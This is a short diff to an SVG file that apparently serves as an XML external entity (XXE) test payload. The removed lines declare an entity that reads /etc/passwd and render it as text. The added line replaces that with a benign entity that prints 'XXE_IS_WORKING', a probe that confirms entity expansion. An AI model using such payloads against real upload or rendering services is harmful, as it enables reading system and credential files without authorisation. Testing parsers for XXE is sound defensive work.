@@ -1,16 +1,1 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE svg [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<svg width="1200" height="800" xmlns="http://www.w3.org/2000/svg">
-  <style>
-    text {
-      font-family: monospace;
-      font-size: 12px;
-      white-space: pre-wrap; /* Use pre-wrap to handle the long string */
-    }
-  </style>
-  <text x="10" y="20">
-    &xxe;
-  </text>
-</svg>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [  <!ENTITY test "XXE_IS_WORKING">]><svg width="300" height="100" xmlns="http://www.w3.org/2000/svg">  <style>    text { font-family: sans-serif; font-size: 20px; }  </style>  <text x="10" y="50">    &test;  </text></svg>
